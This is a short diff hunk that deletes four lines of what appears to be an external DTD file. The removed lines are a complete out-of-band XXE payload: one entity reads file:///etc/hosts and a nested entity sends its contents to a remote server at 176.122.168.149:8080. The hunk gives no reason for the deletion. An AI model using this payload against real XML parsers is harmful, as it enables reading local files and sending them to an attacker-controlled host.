@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/hosts"> 
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://176.122.168.149:8080/%file;'>"> 
-%int; 
-%send;
